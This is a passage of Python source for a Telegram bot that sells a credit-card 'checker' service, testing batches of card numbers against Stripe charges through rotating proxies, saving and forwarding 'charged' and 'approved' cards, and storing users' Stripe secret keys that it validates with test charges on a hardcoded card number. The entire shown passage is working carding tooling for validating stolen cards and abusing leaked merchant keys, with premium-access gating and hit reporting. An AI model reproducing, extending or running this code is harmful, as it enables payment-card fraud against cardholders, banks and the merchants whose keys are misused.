                f"{pe(R['cc'])} {bold('CC:')} <tg-spoiler>{cc_str}</tg-spoiler>\n"
                f"{pe(R['gate'])} {bold('Gate:')} {bold(gate_label)}\n"
                f"{pe(R['gate'])} {bold('Response:')} {_gate_msg_display(msg)}\n"
                f"{pe(R['checked_by'])} {user_link(user_id, message.from_user.full_name or '', message.from_user.username or '')}"
            )
        except Exception as e2:
            log.error("usd1 edit_text fallback failed: %s", e2)
    await _usd1_notify_hit(
        status, msg, code, result_text, cc_str, user_id,
        message.from_user.full_name or "", gate_label, message, loading_msg,
    )


async def _usd1_mass_check_single(
    cc_str: str, proxy_list: list, checker, gate_label: str,
    status_msg: types.Message, results: dict, order: list,
    locks: dict, user_id: int, user_name: str, user_uname: str,
    message: types.Message,
):
    sem = get_user_semaphore(user_id)
    _bin = asyncio.create_task(bin_lookup(cc_str.split("|")[0][:6]))
    async with sem:
        status, msg, code = await _usd1_execute(cc_str, proxy_list, checker)
    bin_info = await _bin
    results[cc_str] = {"status": status, "msg": msg, "code": code, "bin": bin_info}
    status, msg, code = _usd1_normalize(status, msg, code)
    results[cc_str]["status"] = status
    results[cc_str]["msg"] = msg
    results[cc_str]["code"] = code
    if gate_is_charged(status, code, msg):
        auth.save_charged_cc(cc_str, user_id, user_name, gate_label, "1")
    msg_id = status_msg.message_id
    if msg_id not in locks:
        locks[msg_id] = asyncio.Lock()
    async with locks[msg_id]:
        done = sum(1 for c in order if c in results)
        lines = [f"{pe(E['bolt'])} {bold(gate_label)} Mass [{bold(str(done))}/{bold(str(len(order)))}]\n"]
        for cc in order:
            if cc in results:
                e = results[cc]
                sl = _usd1_status_line(e["status"], e["msg"], e["code"])
                bi = e["bin"]
                lines.append(
                    f"{sl}\n{pe(R['cc'])} <tg-spoiler>{cc}</tg-spoiler>\n"
                    f"{pe(R['gate'])} {bold(e['msg'][:80])}\n"
                    f"{pe(R['bin_info'])} {bi['brand']} | {bi['type']} | {bi['flag']} {bi['country']}"
                )
            else:
                lines.append(f"{pe(E['loading'])} <tg-spoiler>{cc}</tg-spoiler> checking...")
        lines.append(f"\n{pe(R['checked_by'])} {user_link(user_id, user_name, user_uname)}")
        try:
            await safe_edit(status_msg, "\n\n".join(lines))
        except Exception:
            pass
        if done >= len(order):
            locks.pop(msg_id, None)
    if gate_is_charged(status, code, msg):
        try:
            hit = _usd1_result_text(cc_str, gate_label, status, msg, code, bin_info, user_id, user_name, user_uname)
            await bot.send_message(auth.MONITOR_GROUP_ID, hit)
        except Exception:
            pass
    elif gate_is_approved(status, code, msg):
        try:
            hit = _usd1_result_text(cc_str, gate_label, status, msg, code, bin_info, user_id, user_name, user_uname)
            await _send_approved(hit)
        except Exception:
            pass


async def _usd1_mass_cmd(message: types.Message, gate_label: str, checker, max_ccs: int, locks: dict):
    joined = await check_user_joined(message.from_user.id)
    if not joined:
        await message.reply(JOIN_MSG, reply_markup=join_keyboard())
        return
    user_id = message.from_user.id
    if auth.is_banned(user_id):
        return
    if not auth.has_premium_access(user_id, message.chat.id):
        await message.reply(f"{pe(E['cross'])} {bold('Premium Access Required!')}")
        return
    raw_text = message.text.split(maxsplit=1)[1] if " " in message.text else ""
    if message.reply_to_message:
        rt = message.reply_to_message.text or message.reply_to_message.caption or ""
        raw_text = (raw_text + "\n" + rt).strip() if raw_text else rt
    all_ccs = _extract_cc_list(raw_text, max_ccs)
    if not all_ccs:
        await message.reply(f"{pe(E['cross'])} {bold('No valid CCs found!')}")
        return
    proxy_list = get_user_proxies(user_id)
    if not proxy_list:
        await message.reply(f"{pe(E['cross'])} {bold('No Proxy Set!')} /proxy")
        return
    user_name = message.from_user.full_name or ""
    user_uname = message.from_user.username or ""
    total = len(all_ccs)
    init = [f"{pe(E['bolt'])} {bold(gate_label)} Mass [0/{total}]\n"]
    init += [f"{pe(E['loading'])} <tg-spoiler>{c}</tg-spoiler>" for c in all_ccs]
    init.append(f"\n{pe(R['checked_by'])} {user_link(user_id, user_name, user_uname)}")
    status_msg = await message.reply("\n\n".join(init))
    results: dict = {}
    order = list(all_ccs)
    await asyncio.gather(*[
        asyncio.create_task(
            _usd1_mass_check_single(
                cc, proxy_list, checker, gate_label, status_msg, results, order,
                locks, user_id, user_name, user_uname, message,
            )
        ) for cc in all_ccs
    ], return_exceptions=True)


async def _usd1txt_wrap_task(
    cc_str: str, proxy_list: list, checker, user_id: int,
) -> tuple[str, str, str, str]:
    sem = get_user_semaphore(user_id)
    async with sem:
        try:
            status, msg, code = await _usd1_execute(cc_str, proxy_list, checker)
        except Exception as e:
            status, msg, code = "error", str(e)[:80], "exception"
    status, msg, code = _usd1_normalize(status, msg, code)
    return status, msg, code, cc_str


async def _process_usd1txt(
    all_ccs: list, user_id: int, user_name: str, user_uname: str,
    chat_id: int, status_msg: types.Message, stop_key: str,
    proxy_list: list, checker, gate_label: str, stop_flags: dict, prefix: str,
):
    """File check — same flow as /ran: parallel batches, progress, hit messages."""
    total = len(all_ccs)
    checked, approved, charged_count, declined, skipped = 0, 0, 0, 0, 0
    _start_time = time.time()
    _last_status_edit = 0.0

    try:
        for i in range(0, len(all_ccs), USD1TXT_BATCH_SIZE):
            if stop_flags.get(stop_key):
                skipped += len(all_ccs) - i - checked
                break

            batch = all_ccs[i:i + USD1TXT_BATCH_SIZE]
            wrapped = []
            for cc in batch:
                if stop_flags.get(stop_key):
                    break
                wrapped.append(_usd1txt_wrap_task(cc, proxy_list, checker, user_id))

            if not wrapped:
                continue

            for fut in asyncio.as_completed(wrapped):
                status, msg, code, cc = await fut

                if stop_flags.get(stop_key):
                    skipped += 1
                    continue

                checked += 1

                is_charged = gate_is_charged(status, code, msg)
                is_approved = gate_is_approved(status, code, msg)
                should_send = False

                if is_charged:
                    charged_count += 1
                    approved += 1
                    should_send = True
                elif is_approved:
                    approved += 1
                    should_send = True
                else:
                    declined += 1

                if should_send:
                    bin_num = cc.split("|")[0][:6]
                    try:
                        bin_info = await asyncio.wait_for(bin_lookup(bin_num), timeout=15.0)
                    except asyncio.TimeoutError:
                        bin_info = {"brand": "-", "type": "-", "level": "-", "bank": "-", "country": "-", "flag": "🏳️"}
                    hit_text = _usd1_result_text(
                        cc, gate_label, status, msg, code, bin_info,
                        user_id, user_name, user_uname,
                    )
                    try:
                        sent_msg = await bot.send_message(chat_id, hit_text)
                        if is_charged:
                            auth.save_charged_cc(cc, user_id, user_name, gate_label, "1")
                            try:
                                await bot.pin_chat_message(chat_id, sent_msg.message_id, disable_notification=True)
                            except Exception:
                                pass
                            try:
                                await bot.send_message(auth.MONITOR_GROUP_ID, hit_text)
                            except Exception:
                                pass
                        else:
                            await _send_approved(hit_text)
                    except Exception:
                        pass

                _now = time.time()
                if _now - _last_status_edit >= 3 or (checked + skipped) >= total:
                    _last_status_edit = _now
                    stop_btn = {
                        "inline_keyboard": [[{
                            "text": f"{bold('Stop Checking')}",
                            "callback_data": f"{prefix}_stop:{stop_key}",
                            "icon_custom_emoji_id": E["stop"],
                            "style": "danger",
                        }]]
                    }
                    progress_text = (
                        f"{pe(E['rocket'])} {bold(gate_label)} {bold('File Check')}\n\n"
                        f"{pe(E['bolt'])} {bold('Response:')} {_gate_msg_display(msg, 60)}\n"
                        f"{pe(R['cc'])} <tg-spoiler>{cc}</tg-spoiler>\n\n"
                        f"{pe(E['bolt'])} {bold('Progress:')} {bold(str(checked + skipped))}/{bold(str(total))}\n"
                        f"{pe(E['gem'])} {bold('Charged:')} {bold(str(charged_count))}\n"
                        f"{pe(E['check'])} {bold('Approved:')} {bold(str(approved))}\n"
                        f"{pe(E['cross'])} {bold('Declined:')} {bold(str(declined))}\n"
                        f"{pe(E['hourglass'])} {bold('Remaining:')} {bold(str(total - checked - skipped))}\n\n"
                        f"{pe(R['checked_by'])} {bold('Checked by:')} {user_link(user_id, user_name, user_uname)}"
                    )
                    try:
                        if (checked + skipped) >= total:
                            await safe_edit(status_msg, progress_text)
                        else:
                            await safe_edit(status_msg, progress_text, reply_markup=stop_btn)
                    except Exception:
                        pass

    finally:
        stop_flags.pop(stop_key, None)

    _elapsed = int(time.time() - _start_time)
    _elapsed_str = f"{_elapsed // 60}m {_elapsed % 60}s" if _elapsed >= 60 else f"{_elapsed}s"
    try:
        await safe_edit(status_msg, 
            f"{pe(E['check'])} {bold(gate_label)} {bold('File Check Complete!')}\n\n"
            f"{pe(E['bolt'])} {bold('Total:')} {bold(str(total))}\n"
            f"{pe(E['gem'])} {bold('Charged:')} {bold(str(charged_count))}\n"
            f"{pe(E['check'])} {bold('Approved:')} {bold(str(approved))}\n"
            f"{pe(E['cross'])} {bold('Declined:')} {bold(str(declined))}\n"
            f"{pe(E['warn'])} {bold('Skipped:')} {bold(str(skipped))}\n"
            f"{pe(E['hourglass'])} {bold('Time:')} {bold(_elapsed_str)}\n\n"
            f"{pe(R['checked_by'])} {bold('Checked by:')} {user_link(user_id, user_name, user_uname)}"
        )
    except Exception:
        pass


async def _usd1txt_cmd(message: types.Message, gate_label: str, checker, stop_flags: dict, active_users: set, prefix: str):
    joined = await check_user_joined(message.from_user.id)
    if not joined:
        await message.reply(JOIN_MSG, reply_markup=join_keyboard())
        return
    user_id = message.from_user.id
    if auth.is_banned(user_id):
        return
    if not auth.has_premium_access(user_id, message.chat.id):
        await message.reply(
            f"{pe(E['cross'])} {bold('Premium Access Required!')}"
            f"\n\n{pe(E['bolt'])} {bold('Contact admin or redeem a key: @Mod_By_Kamal')}"
            f"\n{pe(E['next'])} /redeem {bold('Kamal-xxxxx')}"
        )
        return
    if not message.reply_to_message or not message.reply_to_message.document:
        await message.reply(
            f"{pe(E['warn'])} {bold('Usage:')}\n\n"
            f"{pe(E['next'])} {bold('Send a .txt file with CCs')}\n"
            f"{pe(E['next'])} {bold('Reply to the file with')} /{prefix}\n\n"
            f"{pe(E['bolt'])} {bold('Format:')} cc|mm|yy|cvv {bold('(one per line)')}"
        )
        return
    doc = message.reply_to_message.document
    if not doc.file_name or not doc.file_name.lower().endswith(".txt"):
        await message.reply(f"{pe(E['cross'])} {bold('Only .txt files are supported!')}")
        return
    proxy_list = get_user_proxies(user_id)
    if not proxy_list:
        await message.reply(
            f"{pe(E['cross'])} {bold('No Proxy Set!')}\n\n"
            f"{pe(E['warn'])} {bold('Add proxies first with')} /proxy"
        )
        return
    try:
        from io import BytesIO
        buf = BytesIO()
        await bot.download(doc.file_id, destination=buf)
        buf.seek(0)
        file_text = buf.read().decode("utf-8", errors="ignore")
    except Exception:
        await message.reply(f"{pe(E['cross'])} {bold('Failed to download file!')}")
        return

    from helpers import CC_PATTERN
    all_ccs: list[str] = []
    for m in CC_PATTERN.finditer(file_text):
        cc = f"{m.group(1)}|{m.group(2)}|{m.group(3)}|{m.group(4)}"
        if cc not in all_ccs:
            all_ccs.append(cc)
    if not all_ccs:
        for line in file_text.strip().splitlines():
            parts = re.split(r"[|/]", line.strip())
            if len(parts) >= 4:
                cc = "|".join(p.strip() for p in parts[:4])
                if cc not in all_ccs:
                    all_ccs.append(cc)

    if not all_ccs:
        await message.reply(f"{pe(E['cross'])} {bold('No valid CCs found in the file!')}")
        return

    user_name = message.from_user.full_name or ""
    user_uname = message.from_user.username or ""
    cc_limit = auth.get_cc_limit(user_id)
    if len(all_ccs) > cc_limit:
        all_ccs = all_ccs[:cc_limit]
        await message.reply(
            f"{pe(E['warn'])} {bold('CC limit reached!')} {bold(str(cc_limit))} {bold('CCs max for your plan.')}\n"
            f"{pe(E['next'])} {bold('Extra CCs skipped.')}"
        )

    total = len(all_ccs)
    if user_id in active_users:
        await message.reply(
            f"{pe(E['warn'])} {bold('Your file check is already in progress!')}\n\n"
            f"{pe(E['next'])} {bold('Wait for it to finish or tap')} {bold('Stop Checking')} {bold('first.')}"
        )
        return

    stop_key = f"{message.chat.id}:{user_id}"
    stop_flags[stop_key] = False
    active_users.add(user_id)
    try:
        stop_btn = {
            "inline_keyboard": [[{
                "text": f"{bold('Stop Checking')}",
                "callback_data": f"{prefix}_stop:{stop_key}",
                "icon_custom_emoji_id": E["stop"],
                "style": "danger",
            }]]
        }
        status_msg = await message.reply(
            f"{pe(E['rocket'])} {bold(gate_label)} {bold('File Check Started!')}\n\n"
            f"{pe(E['bolt'])} {bold('Total CCs:')} {bold(str(total))}\n"
            f"{pe(E['hourglass'])} {bold('Batch Size:')} {bold(str(USD1TXT_BATCH_SIZE))}\n"
            f"{pe(E['refresh'])} {bold('Random proxy per CC')}\n\n"
            f"{pe(R['checked_by'])} {bold('Checked by:')} {user_link(user_id, user_name, user_uname)}",
            reply_markup=stop_btn,
        )
        await _process_usd1txt(
            all_ccs, user_id, user_name, user_uname,
            message.chat.id, status_msg, stop_key, proxy_list, checker, gate_label, stop_flags, prefix,
        )
    finally:
        active_users.discard(user_id)


@router.message(Command("st1"))
async def cmd_st1(message: types.Message):
    await _usd1_single_cmd(message, "Stripe $1", st1_gate.check_card_str)


@router.message(Command("mst1"))
async def cmd_mst1(message: types.Message):
    await _usd1_mass_cmd(message, "Stripe $1", st1_gate.check_card_str, MST1_MAX_CCS, _MST1_EDIT_LOCKS)


@router.message(Command("st1txt"))
async def cmd_st1txt(message: types.Message):
    await _usd1txt_cmd(message, "Stripe $1", st1_gate.check_card_str, _ST1TXT_STOP_FLAGS, _ST1TXT_ACTIVE_USERS, "st1txt")


@router.callback_query(F.data.startswith("st1txt_stop:"))
async def cb_st1txt_stop(callback: types.CallbackQuery):
    stop_key = callback.data.split(":", 1)[1]
    try:
        owner_id = int(stop_key.split(":")[-1])
    except (ValueError, IndexError):
        owner_id = 0
    if callback.from_user.id != owner_id and not auth.is_admin(callback.from_user.id):
        await callback.answer(bold("Only owner can stop"), show_alert=True)
        return
    _ST1TXT_STOP_FLAGS[stop_key] = True
    await callback.answer(bold("Stopping..."), show_alert=False)
    try:
        await callback.message.edit_reply_markup(reply_markup=None)
    except Exception:
        pass


# ══════════════════════════════════════════════════════════════════════════════
#  STRIPE SK CVV $1  /skadd /skcvv /mskcvv /sktxt  (direct Stripe API — no proxy)
# ══════════════════════════════════════════════════════════════════════════════

MSKCVV_MAX_CCS = 20
SKTXT_BATCH_SIZE = 5
SKCVV_CHECK_TIMEOUT = 75.0
SKCVV_GATE_LABEL = "Stripe SK Based CVV"
SKCVV_TEST_CC = "5457082253838044|05|28|142"

_MSKCVV_EDIT_LOCKS: dict[int, asyncio.Lock] = {}
_SKTXT_STOP_FLAGS: dict[str, bool] = {}
_SKTXT_ACTIVE_USERS: set[int] = set()

_skkeys_cache: dict | None = None
_skkeys_cache_mtime: float = 0.0


def _load_skkeys() -> dict:
    global _skkeys_cache, _skkeys_cache_mtime
    try:
        mt = os.path.getmtime(SKKEYS_FILE)
    except OSError:
        return {}
    if _skkeys_cache is not None and mt == _skkeys_cache_mtime:
        return _skkeys_cache
    try:
        with open(SKKEYS_FILE, "r", encoding="utf-8") as f:
            _skkeys_cache = json.load(f)
            _skkeys_cache_mtime = mt
            return _skkeys_cache
    except Exception:
        return {}


def _save_skkeys(data: dict):
    global _skkeys_cache, _skkeys_cache_mtime
    with open(SKKEYS_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)
    _skkeys_cache = data
    try:
        _skkeys_cache_mtime = os.path.getmtime(SKKEYS_FILE)
    except OSError:
        _skkeys_cache_mtime = 0.0


def get_user_skkeys(user_id: int) -> tuple[str, str] | None:
    """Return (sk, pk) for user or None."""
    entry = _load_skkeys().get(str(user_id))
    if not isinstance(entry, dict):
        return None
    sk = (entry.get("sk") or "").strip()
    pk = (entry.get("pk") or "").strip()
    if sk.startswith("sk_") and pk.startswith("pk_"):
        return sk, pk
    return None


def set_user_skkeys(user_id: int, sk: str, pk: str):
    data = _load_skkeys()
    data[str(user_id)] = {"sk": sk.strip(), "pk": pk.strip()}
    _save_skkeys(data)


def del_user_skkeys(user_id: int):
    data = _load_skkeys()
    if str(user_id) in data:
        del data[str(user_id)]
        _save_skkeys(data)


def _parse_sk_pk(text: str) -> tuple[str | None, str | None]:
    """Extract sk_live/test + pk_live/test from free text."""
    sk_m = re.search(r"(sk_(?:live|test)_[A-Za-z0-9_\-]+)", text or "")
    pk_m = re.search(r"(pk_(?:live|test)_[A-Za-z0-9_\-]+)", text or "")
    return (sk_m.group(1) if sk_m else None), (pk_m.group(1) if pk_m else None)


def _skcvv_mask_key(key: str) -> str:
    if len(key) <= 16:
        return key[:8] + "…"
    return key[:12] + "…" + key[-6:]


def _skcvv_status_line(status: str, msg: str, code: str, amount: str = "") -> str:
    amt = f" ({amount})" if amount else ""
    if gate_is_charged(status, code, msg):
        return f"{pe(E['gem'])} {bold(f'Charged{amt}!')}"
    if code == "ccn":
        return f"{pe(E['check3'])} {bold('CCN — Incorrect CVC')}"
    if code == "live_limit":
        return f"{pe(E['check2'])} {bold('Insufficient Funds — Live')}"
    if code == "3ds" or gate_is_approved(status, code, msg):
        return f"{pe(E['check'])} {bold('Approved / 3DS')}"
    if code in ("invalid_key",):
        return f"{pe(E['cross'])} {bold('Invalid / Dead SK')}"
    if code in ("proxy_error", "connection_error", "timeout", "exception"):
        return f"{pe(E['warn'])} {bold('Connection / Timeout')}"
    if status == "declined":
        return f"{pe(E['cross'])} {bold('Declined')}"
    return f"{pe(E['warn2'])} {bold(msg[:60])}"


def _skcvv_result_text(
    cc_str: str, status: str, msg: str, code: str, bin_info: dict,
    user_id: int, user_name: str, user_uname: str | None,
    amount: str = "",
) -> str:
    sl = _skcvv_status_line(status, msg, code, amount)
    price_display = amount if amount else "$1.00"
    return (
        f"{sl}\n\n"
        f"{pe(R['cc'])} {bold('CC:')} <tg-spoiler>{cc_str}</tg-spoiler>\n"
        f"{pe(R['gate'])} {bold('Gate:')} {bold(SKCVV_GATE_LABEL)}\n"
        f"{pe(R['price'])} {bold('Amount:')} {bold(price_display)}\n"
        f"{pe(R['gate'])} {bold('Response:')} {_gate_msg_display(msg)}\n\n"
        f"{pe(R['bin_info'])} {bold('BIN Info:')}\n"
        f"{brand_emoji(bin_info['brand'])}{bold('Brand:')} {bold(bin_info['brand'])}\n"
        f"{pe(R['type'])} {bold('Type:')} {bold(bin_info['type'])}\n"
        f"{pe(R['level'])} {bold('Level:')} {bold(bin_info['level'])}\n"
        f"{pe(R['bank'])} {bold('Bank:')} {bold(bin_info['bank'])}\n"
        f"{pe(R['country'])} {bold('Country:')} {bin_info['flag']} {bold(bin_info['country'])}\n\n"
        f"{pe(R['checked_by'])} {bold('Checked by:')} "
        f"{user_link(user_id, user_name, user_uname)}"
    )


async def _skcvv_execute(sk: str, pk: str, cc_str: str, user_id: int = 0) -> tuple[str, str, str, str]:
    if skcvv is None:
        return "error", "skcvv_fuction.py not loaded", "exception", ""
    # Resolve proxy the same way /sh and /msh do — per-user proxy from proxy.json
    proxy_url: str | None = None
    if user_id:
        try:
            proxy_data = get_user_proxy(user_id)
            if proxy_data:
                proxy_url = proxy_dict_to_url(proxy_data)
        except Exception:
            pass
    try:
        result = await asyncio.wait_for(
            skcvv.check_card(sk, pk, cc_str, "usd", proxy_url=proxy_url),
            timeout=SKCVV_CHECK_TIMEOUT,
        )
        if len(result) == 4:
            return result
        # backward-compat if check_card returns old 3-tuple
        return result[0], result[1], result[2], ""
    except asyncio.TimeoutError:
        return "error", "Check timed out", "timeout", ""
    except Exception as e:
        return "error", str(e)[:80], "exception", ""


async def _skcvv_notify_hit(
    status: str, msg: str, code: str, result_text: str, cc_str: str,
    user_id: int, user_name: str, message: types.Message, loading_msg: types.Message,
):
    status, msg, code = classify_gate_response(msg, status_hint=status, code_hint=code)
    if gate_is_charged(status, code, msg):
        auth.save_charged_cc(cc_str, user_id, user_name or "Unknown", SKCVV_GATE_LABEL, "1")
        try:
            await bot.pin_chat_message(
                message.chat.id, loading_msg.message_id, disable_notification=True,
            )
        except Exception:
            pass
        try:
            await bot.send_message(auth.MONITOR_GROUP_ID, result_text)
        except Exception:
            pass
    elif gate_is_approved(status, code, msg):
        await _send_approved(result_text)


def _skcvv_key_is_live(status: str, msg: str, code: str) -> bool:
    """True when test charge proves the SK works (any card-level outcome)."""
    status, msg, code = classify_gate_response(msg, status_hint=status, code_hint=code)
    if status == "error" or code in (
        "invalid_key", "timeout", "exception", "proxy_error",
        "connection_error", "failed", "bad_format",
    ):
        return False
    # declined / charged / approved (cvc, insufficient, 3ds, …) = live key
    return status in ("charged", "declined", "approved") or code in (
        "charged", "declined", "ccn", "live_limit", "3ds", "approved",
    )


async def _skcvv_resolve_pk(sk: str, pk: str | None) -> tuple[str | None, str]:
    """
    Return (pk, source) where source is 'manual' | 'auto' | 'missing'.
    Auto-extracts from Checkout Session when PK not provided.
    """
    if pk and pk.startswith("pk_"):
        return pk, "manual"
    if skcvv is None:
        return None, "missing"
    try:
        auto_pk = await asyncio.wait_for(skcvv.extract_pk_from_checkout(sk), timeout=25.0)
    except Exception:
        auto_pk = None
    if auto_pk and str(auto_pk).startswith("pk_"):
        return str(auto_pk), "auto"
    return None, "missing"


# ── /skadd /mysk /skrem ───────────────────────────────────────────────────────

@router.message(Command("skadd"))
async def cmd_skadd(message: types.Message):
    joined = await check_user_joined(message.from_user.id)
    if not joined:
        await message.reply(JOIN_MSG, reply_markup=join_keyboard())
        return
    user_id = message.from_user.id
    if auth.is_banned(user_id):
        return
    if not auth.has_premium_access(user_id, message.chat.id):
        await message.reply(f"{pe(E['cross'])} {bold('Premium Access Required!')}")
        return
    if skcvv is None:
        await message.reply(f"{pe(E['cross'])} {bold('SK CVV module not available!')}")
        return

    raw = ""
    args = message.text.split(maxsplit=1)
    if len(args) >= 2:
        raw = args[1]
    if message.reply_to_message:
        rt = message.reply_to_message.text or message.reply_to_message.caption or ""
        raw = (raw + "\n" + rt).strip() if raw else rt

    sk, pk = _parse_sk_pk(raw)
    if not sk:
        await message.reply(
            f"{pe(E['warn'])} {bold('Usage:')}\n\n"
            f"{pe(E['next'])} /skadd sk_live_xxx\n"
            f"{pe(E['next'])} /skadd sk_live_xxx pk_live_xxx  {bold('(manual PK)')}\n\n"
            f"{pe(E['bolt'])} {bold('Auto-fetches PK from Checkout Session.')}\n"
            f"{pe(E['star'])} {bold('Verifies key with a test charge before saving.')}"
        )
        return

    loading = await message.reply(
        f"{pe(E['loading'])} {bold('Validating Stripe SK...')}\n\n"
        f"{pe(E['bolt'])} {bold('SK:')} <code>{_skcvv_mask_key(sk)}</code>\n"
        f"{pe(E['hourglass'])} {bold('Resolving publishable key...')}"
    )

    resolved_pk, pk_source = await _skcvv_resolve_pk(sk, pk)
    if not resolved_pk:
        await safe_edit(loading,
            f"{pe(E['warn'])} {bold('Could not auto-fetch PK!')}\n\n"
            f"{pe(E['bolt'])} {bold('SK:')} <code>{_skcvv_mask_key(sk)}</code>\n\n"
            f"{pe(E['next'])} {bold('Add PK manually:')}\n"
            f"/skadd <code>{sk}</code> pk_live_xxx\n\n"
            f"{pe(E['star'])} {bold('Key was')} {bold('not')} {bold('saved.')}"
        )
        return

    await safe_edit(loading,
        f"{pe(E['loading'])} {bold('Validating Stripe SK...')}\n\n"
        f"{pe(E['bolt'])} {bold('SK:')} <code>{_skcvv_mask_key(sk)}</code>\n"
        f"{pe(E['bolt'])} {bold('PK:')} <code>{_skcvv_mask_key(resolved_pk)}</code> "
        f"({bold('auto') if pk_source == 'auto' else bold('manual')})\n"
        f"{pe(E['hourglass'])} {bold('Test charge:')} <tg-spoiler>{SKCVV_TEST_CC}</tg-spoiler>"
    )

    status, msg, code, amount = await _skcvv_execute(sk, resolved_pk, SKCVV_TEST_CC, user_id)
    status, msg, code = classify_gate_response(msg, status_hint=status, code_hint=code)
    sl = _skcvv_status_line(status, msg, code, amount)

    if not _skcvv_key_is_live(status, msg, code):
        await safe_edit(loading,
            f"{pe(E['cross'])} {bold('SK not saved — test failed!')}\n\n"
            f"{sl}\n"
            f"{pe(R['gate'])} {bold('Response:')} {_gate_msg_display(msg)}\n\n"
            f"{pe(E['bolt'])} {bold('SK:')} <code>{_skcvv_mask_key(sk)}</code>\n"
            f"{pe(E['bolt'])} {bold('PK:')} <code>{_skcvv_mask_key(resolved_pk)}</code>\n"
            f"{pe(R['cc'])} {bold('Test CC:')} <tg-spoiler>{SKCVV_TEST_CC}</tg-spoiler>\n\n"
            f"{pe(E['warn'])} {bold('Fix the key / permissions and try again.')}"
        )
        return

    set_user_skkeys(user_id, sk, resolved_pk)
    await safe_edit(loading,
        f"{pe(E['check'])} {bold('Stripe keys verified & saved!')}\n\n"
        f"{sl}\n"
        f"{pe(R['gate'])} {bold('Test Response:')} {_gate_msg_display(msg)}\n\n"
        f"{pe(E['bolt'])} {bold('SK:')} <code>{_skcvv_mask_key(sk)}</code>\n"
        f"{pe(E['bolt'])} {bold('PK:')} <code>{_skcvv_mask_key(resolved_pk)}</code> "
        f"({bold('auto') if pk_source == 'auto' else bold('manual')})\n"
        f"{pe(R['cc'])} {bold('Test CC:')} <tg-spoiler>{SKCVV_TEST_CC}</tg-spoiler>\n\n"
        f"{pe(E['next'])} /skcvv cc|mm|yy|cvv\n"
        f"{pe(E['next'])} /mskcvv  {bold('or')}  /sktxt"
    )


@router.message(Command("mysk"))
async def cmd_mysk(message: types.Message):
    joined = await check_user_joined(message.from_user.id)
    if not joined:
        await message.reply(JOIN_MSG, reply_markup=join_keyboard())
        return
    user_id = message.from_user.id
    if auth.is_banned(user_id):
        return
    keys = get_user_skkeys(user_id)
    if not keys:
        await message.reply(
            f"{pe(E['warn'])} {bold('No SK/PK saved!')}\n\n"
            f"{pe(E['next'])} /skadd sk_live_xxx"
        )
        return
    sk, pk = keys
    await message.reply(
        f"{pe(E['check'])} {bold('Your Stripe keys:')}\n\n"
        f"{pe(E['bolt'])} {bold('SK:')} <code>{_skcvv_mask_key(sk)}</code>\n"
        f"{pe(E['bolt'])} {bold('PK:')} <code>{_skcvv_mask_key(pk)}</code>\n\n"
        f"{pe(E['cross'])} /skrem — {bold('Remove keys')}"
    )


@router.message(Command("skrem"))
async def cmd_skrem(message: types.Message):
    joined = await check_user_joined(message.from_user.id)
    if not joined:
        await message.reply(JOIN_MSG, reply_markup=join_keyboard())
        return
    user_id = message.from_user.id
    if auth.is_banned(user_id):
        return
    if not get_user_skkeys(user_id):
        await message.reply(f"{pe(E['warn'])} {bold('No keys to remove.')}")
        return
    del_user_skkeys(user_id)
    await message.reply(f"{pe(E['check'])} {bold('Stripe keys removed.')}")


# ── /skcvv — single ───────────────────────────────────────────────────────────

@router.message(Command("skcvv"))
async def cmd_skcvv(message: types.Message):
    joined = await check_user_joined(message.from_user.id)
    if not joined:
        await message.reply(JOIN_MSG, reply_markup=join_keyboard())
        return
    user_id = message.from_user.id
    if auth.is_banned(user_id):
        return
    if not auth.has_premium_access(user_id, message.chat.id):
        await message.reply(
            f"{pe(E['cross'])} {bold('Premium Access Required!')}"
            f"\n\n{pe(E['bolt'])} {bold('Contact admin or redeem a key: @Mod_By_Kamal')}"
            f"\n{pe(E['next'])} /redeem {bold('Kamal-xxxxx')}"
        )
        return
    if skcvv is None:
        await message.reply(f"{pe(E['cross'])} {bold('SK CVV module not available!')}")
        return

    raw = ""
    args = message.text.split(maxsplit=1)
    if len(args) >= 2:
        raw = args[1]
    if message.reply_to_message:
        rt = message.reply_to_message.text or message.reply_to_message.caption or ""
        raw = (raw + "\n" + rt).strip() if raw else rt

    sk, pk = _parse_sk_pk(raw)
    saved = get_user_skkeys(user_id)
    if not sk or not pk:
        if saved:
            sk, pk = saved
        else:
            await message.reply(
                f"{pe(E['warn'])} {bold('No SK/PK found!')}\n\n"
                f"{pe(E['next'])} /skadd sk_live_xxx pk_live_xxx\n"
                f"{pe(E['next'])} {bold('Or:')} /skcvv sk pk cc|mm|yy|cvv"
            )
            return

    cc_str = extract_cc(raw)
    if not cc_str:
        # strip keys then retry
        cleaned = re.sub(r"(?:sk|pk)_(?:live|test)_[A-Za-z0-9]+", " ", raw)
        cc_str = extract_cc(cleaned)
        if not cc_str:
            parts = re.split(r"[|/]", cleaned.strip())
            # find a 15-16 digit number among tokens
            for i, p in enumerate(parts):
                if re.fullmatch(r"\d{15,16}", p.strip()) and i + 3 < len(parts):
                    cc_str = "|".join(x.strip() for x in parts[i:i + 4])
                    break
    if not cc_str:
        await message.reply(
            f"{pe(E['warn'])} {bold('No CC found!')}\n\n"
            f"{pe(E['next'])} {bold('Usage:')} /skcvv 4111111111111111|01|2030|123\n"
            f"{pe(E['next'])} {bold('Or:')} /skcvv sk_live_xxx pk_live_xxx cc|mm|yy|cvv"
        )
        return

    bin_num = cc_str.split("|")[0][:6]
    loading_msg = await message.reply(
        f"{pe(E['loading'])} {bold('Checking CC...')}\n\n"
        f"{pe(E['bolt'])} {bold('CC:')} <tg-spoiler>{cc_str}</tg-spoiler>\n"
        f"{pe(E['globe'])} {bold('Gate:')} {bold(SKCVV_GATE_LABEL)}\n"
        f"{pe(E['hourglass'])} {bold('Processing...')}"
    )
    _bin = asyncio.create_task(bin_lookup(bin_num))
    sem = get_user_semaphore(user_id)
    async with sem:
        status, msg, code, amount = await _skcvv_execute(sk, pk, cc_str, user_id)
    try:
        bin_info = await asyncio.wait_for(_bin, timeout=15.0)
    except asyncio.TimeoutError:
        bin_info = {"brand": "-", "type": "-", "level": "-", "bank": "-", "country": "-", "flag": "🏳️"}

    status, msg, code = classify_gate_response(msg, status_hint=status, code_hint=code)
    user_name = message.from_user.full_name or ""
    user_uname = message.from_user.username or ""
    result_text = _skcvv_result_text(
        cc_str, status, msg, code, bin_info, user_id, user_name, user_uname, amount,
    )
    await safe_edit(loading_msg, result_text)
    await _skcvv_notify_hit(
        status, msg, code, result_text, cc_str, user_id, user_name, message, loading_msg,
    )


# ── /mskcvv — mass ────────────────────────────────────────────────────────────

